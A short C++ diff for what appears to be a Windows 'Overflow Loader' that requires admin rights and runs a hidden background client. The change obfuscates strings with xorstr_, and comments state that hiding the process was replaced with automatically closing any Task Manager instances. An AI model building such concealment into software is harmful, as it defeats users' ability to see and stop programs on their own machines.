@@ -25,7 +25,7 @@ int main(int argc, char* argv[]) {
 	if (std::string(argv[0]).find("OverflowClient.exe") != std::string::npos) {
 		/* Check If Elevated */
 		if (!helpers::is_elevated()) {
-			MessageBox(GetConsoleWindow(), "Overflow Loader Must Be Ran As Admin", "Error", MB_OK | MB_ICONQUESTION);
+			MessageBox(GetConsoleWindow(), xorstr_("Overflow Loader Must Be Ran As Admin"), xorstr_("Error"), MB_OK | MB_ICONQUESTION);
 			return 0;
 		}
 
@@ -43,6 +43,8 @@ int main(int argc, char* argv[]) {
 	}
 	else {
 		/* Setup To Hide Our Background Client */
+		// commented and replaced with
+		// auto closing any task manager instances
 		//hide_process(client::STARTUP_FILE_NAME);
 
 		/* Background */
